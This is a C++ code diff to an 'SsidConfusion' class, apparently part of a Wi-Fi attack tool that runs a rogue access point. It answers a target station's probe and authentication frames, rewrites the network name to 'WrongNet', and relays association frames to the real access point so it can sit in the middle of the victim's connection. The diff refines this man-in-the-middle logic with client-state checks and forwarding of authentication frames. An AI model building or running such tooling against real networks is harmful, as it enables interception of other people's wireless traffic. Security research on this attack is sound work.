@@ -28,7 +28,8 @@ FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pd
 		resp->addr1(addr2);
 		send_to_rogue(*resp);
 		display_traffic(*pdu, "Rogue channel", " -- Replied");
-		client_state.update_state(ClientState::Finding);
+		if(addr2 == HWAddress<6>(sta.get(SK::mac)) && client_state.get_state() < ClientState::Authenticated)
+			client_state.update_state(ClientState::Finding);
 		return STOP;
 	}
 	if(dot11.find_pdu<Dot11ProbeResponse>()) return STOP;
@@ -38,6 +39,7 @@ FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pd
 FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
 		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
+			if(client_state.get_state() >= ClientState::Authenticated) return STOP;
 			// Open System Auth seq=1 ->  seq=2 success
 			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
 			resp.addr3(rogue_ap->get(SK::mac));
@@ -68,41 +70,16 @@ FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr2, const P
 	return CONTINUE;
 }
 FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11, const frame_raw_t &raw) {
-	using R = Dot11ManagementFrame::rates_type::value_type;
-	static const Dot11ManagementFrame::rates_type rates = {
-		static_cast<R>(0x82), // basic 1 Mbps
-		static_cast<R>(0x84), // basic 2 Mbps
-		static_cast<R>(139),
-		static_cast<R>(150),
-		static_cast<R>(36),
-		static_cast<R>(48),
-		static_cast<R>(72),
-		static_cast<R>(96) };
-
-	auto fill_resp = [&](auto &resp, const auto &req) {
-		resp.addr3(rogue_ap.get(SK::mac));
-		resp.status_code(0);
-		resp.capabilities() = probe_resp->capabilities(); // AP caps (ESS=1, Privacy=1), not STA caps
-		resp.aid(1);
-		resp.supported_rates(rates);
-		send_to_rogue(resp);
-	};
-
-	if(const auto *assoc = dot11.find_pdu<Dot11AssocRequest>()) {
-		Dot11AssocResponse resp(addr2, rogue_ap.get(SK::mac));
-		fill_resp(resp, *assoc);
-	} else if(const auto *reassoc = dot11.find_pdu<Dot11ReAssocRequest>()) {
-		Dot11ReAssocResponse resp(addr2, rogue_ap.get(SK::mac));
-		fill_resp(resp, *reassoc);
-	} else {
+	if(!dot11.find_pdu<Dot11AssocRequest>() && !dot11.find_pdu<Dot11ReAssocRequest>())
 		return CONTINUE;
-	}
 
-	display_traffic(dot11, "Rogue channel", " -- Replied and MitMing");
+	if(client_state.get_state() >= ClientState::Associated) return STOP;
+
+	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
+	client_state.update_state(ClientState::Associated);
 
 	auto translated = ensure_radiotap(raw);
 	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
-
 	send_to_real(translated);
 	return STOP;
 }
@@ -125,8 +102,12 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
 	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
-	//TODO dont use raw
-	SOLVE_OR_CONTINUE(handle_open_auth(addr2, *dot11))
+	if(handle_open_auth(addr2, *dot11)) {
+		// also forward to real AP — real AP needs auth before it will accept assoc
+		if(addr2 == HWAddress<6>(sta.get(SK::mac)))
+			send_to_real(ensure_radiotap(raw));
+		return;
+	}
 	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
 	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))
 
